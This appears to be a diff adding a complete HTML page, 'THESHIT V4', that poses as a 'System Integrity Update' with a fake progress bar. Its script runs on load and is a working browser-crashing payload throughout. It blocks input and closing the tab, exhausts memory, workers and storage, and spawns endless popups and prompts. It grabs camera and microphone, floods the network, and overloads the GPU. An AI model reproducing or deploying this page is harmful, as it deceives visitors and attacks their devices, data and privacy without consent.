@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>THESHIT V4</title>
+<style>
+    body, html { margin:0; padding:0; overflow:hidden; background:#000; color:#0f0; font-family:'Courier New',monospace; }
+    #loader { position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); text-align:center; }
+    .progress-bar { width:300px; height:20px; border:2px solid #0f0; margin:20px auto; }
+    .progress { height:100%; background:#0f0; width:0%; transition:width 0.3s; }
+    .log { position:fixed; bottom:10px; left:10px; font-size:12px; opacity:0.7; }
+</style>
+</head>
+<body>
+<div id="loader">
+    <h1>System Integrity Update v3.5</h1>
+    <p>Installing critical patches... Do not close this window.</p>
+    <div class="progress-bar"><div class="progress" id="progress"></div></div>
+    <p id="status">Initializing...</p>
+</div>
+<div class="log" id="log"></div>
+
+<script>
+(function() {
+    const fakeLog = (msg) => document.getElementById('log').innerText += msg + '\n';
+    const updateProgress = (p) => document.getElementById('progress').style.width = p + '%';
+    const updateStatus = (s) => document.getElementById('status').innerText = s;
+
+    const killUI = () => {
+        document.oncontextmenu = document.onkeydown = document.onmousedown = document.onselectstart = () => false;
+        document.body.style.webkitUserSelect = 'none';
+        document.body.style.pointerEvents = 'none';
+        window.addEventListener('beforeunload', (e) => {
+            e.preventDefault();
+            e.returnValue = '';
+            window.open(location.href, '_blank', 'noopener,noreferrer');
+        });
+    };
+
+    const stackMemoryCrash = (depth = 0) => {
+        if (depth > 5000) return;
+        try {
+            const hugeArray = new Array(2e6).fill({data: new ArrayBuffer(1e6)});
+            const hugeString = 'X'.repeat(1e6) + depth + 'Y'.repeat(1e6);
+            document.body.innerHTML += hugeString;
+            stackMemoryCrash(depth + 1);
+            stackMemoryCrash(depth + 1);
+        } catch(e) {
+            stackMemoryCrash(depth + 1);
+        }
+    };
+
+    const hyperWorkerNuke = () => {
+        if (typeof Worker === 'undefined') return;
+        const workerCode = `
+            self.onmessage = () => {
+                const arr = [];
+                for (let i = 0; i < 1000; i++) arr.push(new SharedArrayBuffer(1024 * 1024));
+                setInterval(() => {
+                    const large = new ArrayBuffer(1e7);
+                    postMessage(large);
+                }, 1);
+            };
+        `;
+        const blob = new Blob([workerCode], {type: 'application/javascript'});
+        const url = URL.createObjectURL(blob);
+        for (let i = 0; i < 50; i++) {
+            try {
+                const w = new Worker(url);
+                w.postMessage('start');
+                w.onmessage = () => {};
+            } catch(e) {}
+        }
+    };
+
+    const totalStorageOverkill = () => {
+        setInterval(() => {
+            const giant = 'Z'.repeat(5 * 1024 * 1024);
+            for (let i = 0; i < 50; i++) {
+                try {
+                    localStorage.setItem('blast_' + i, giant);
+                    sessionStorage.setItem('blast_' + i, giant);
+                } catch(e) {}
+            }
+            try {
+                let req = indexedDB.open('CrashDB', 1);
+                req.onupgradeneeded = (e) => {
+                    let db = e.target.result;
+                    db.createObjectStore('bombs');
+                };
+                req.onsuccess = (e) => {
+                    let db = e.target.result;
+                    let tx = db.transaction(['bombs'], 'readwrite');
+                    let store = tx.objectStore('bombs');
+                    for (let j = 0; j < 100; j++) store.put(new ArrayBuffer(5e6), j);
+                };
+            } catch(e) {}
+            document.cookie = 'nuke=' + 'A'.repeat(4096) + '; path=/; max-age=31536000; SameSite=None; Secure';
+        }, 200);
+    };
+
+    const infiniteModalTabHell = () => {
+        setInterval(() => {
+            try {
+                window.open('', '_blank', 'width=200,height=200,left='+Math.random()*2000);
+                alert('CRITICAL: THESHIT');
+                prompt('ENTER THESHITv4 PASSWORD:');
+                confirm('THESHITv4');
+            } catch(e) {}
+        }, 100);
+    };
+
+    const mediaApiBomb = () => {
+        if (!navigator.mediaDevices) return;
+        navigator.mediaDevices.getUserMedia({ video: { width: 9999, height: 9999 }, audio: true })
+        .then(stream => {
+            let tracks = stream.getTracks();
+            const AudioContext = window.AudioContext || window.webkitAudioContext;
+            const ctx = new AudioContext();
+            for (let i = 0; i < 10; i++) {
+                const osc = ctx.createOscillator();
+                osc.connect(ctx.destination);
+                osc.start();
+            }
+            setInterval(() => tracks.forEach(t => t.enabled = !t.enabled), 5);
+        })
+        .catch(() => {});
+    };
+
+    const networkFlood = () => {
+        setInterval(() => {
+            for (let i = 0; i < 5; i++) {
+                fetch(location.href, { mode: 'no-cors' }).catch(() => {});
+                fetch('data:text/html,' + '<!'.repeat(1e6)).catch(() => {});
+            }
+            try {
+                let ws = new WebSocket('wss://' + location.host);
+                ws.onopen = () => {
+                    for (let j = 0; j < 100; j++) ws.send(new Blob(['0'.repeat(1e6)]));
+                };
+            } catch(e) {}
+        }, 50);
+    };
+
+    const recursiveIframeHell = (parent, depth = 0) => {
+        if (depth > 3) return;
+        for (let i = 0; i < 4; i++) {
+            const iframe = document.createElement('iframe');
+            iframe.srcdoc = `
+                <script>
+                    try {
+                        parent.recursiveIframeHell(document.body, ${depth + 1});
+                    } catch(e) {}
+                <\/script>
+            `;
+            parent.appendChild(iframe);
+        }
+    };
+
+    const gpuOverload = () => {
+        const canvas = document.createElement('canvas');
+        canvas.width = 8192;
+        canvas.height = 8192;
+        document.body.appendChild(canvas);
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+            setInterval(() => {
+                const buffer = gl.createBuffer();
+                gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+                gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(5e6), gl.STATIC_DRAW);
+                const texture = gl.createTexture();
+                gl.bindTexture(gl.TEXTURE_2D, texture);
+                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 4096, 4096, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+            }, 10);
+        }
+        const ctx2d = canvas.getContext('2d');
+        setInterval(() => {
+            for (let i = 0; i < 50; i++) {
+                ctx2d.fillStyle = 'rgb(' + Math.random()*255 + ',0,0)';
+                ctx2d.fillRect(Math.random()*8192, Math.random()*8192, 500, 500);
+            }
+        }, 10);
+    };
+
+    const styleBomb = () => {
+        setInterval(() => {
+            document.body.style.cssText += `
+                transform: rotate(${Math.random()*360}deg);
+                background: hsl(${Math.random()*360}, 100%, 10%);
+                filter: blur(${Math.random()*5}px) hue-rotate(${Math.random()*360}deg);
+            `;
+            document.body.animate(
+                [{ transform: 'scale(1)' }, { transform: 'scale(2)' }],
+                { duration: 100, iterations: Infinity }
+            );
+        }, 50);
+    };
+
+    const fakeProgress = () => {
+        let p = 0;
+        const int = setInterval(() => {
+            p += Math.random() * 5;
+            updateProgress(p);
+            updateStatus(['Downloading components...', 'Patching kernel...', 'Encrypting filesystem...', 'Finalizing...'][Math.floor(p/25)] || 'Complete');
+            fakeLog(`[${new Date().toISOString().split('T')[1].split('.')[0]}] Update step ${p.toFixed(1)}%`);
+            if (p >= 100) clearInterval(int);
+        }, 200);
+    };
+
+    window.onload = () => {
+        killUI();
+        fakeProgress();
+        setTimeout(() => {
+            stackMemoryCrash();
+            hyperWorkerNuke();
+            totalStorageOverkill();
+            infiniteModalTabHell();
+            mediaApiBomb();
+            networkFlood();
+            recursiveIframeHell(document.body);
+            gpuOverload();
+            styleBomb();
+        }, 1500);
+
+        setInterval(() => {
+            document.title = '💥 SYSTEM FAILURE 💥';
+            if (document.body) {
+                document.body.innerHTML = '<h1 style="font-size:10vw;color:red;text-align:center;margin-top:20vh;">THESHIT o((>ω< ))o</h1>';
+                document.body.style.background = 'black';
+            }
+            navigator.vibrate && navigator.vibrate([500, 200, 500]);
+        }, 1000);
+    };
+})();
+</script>
+</body>
+</html>
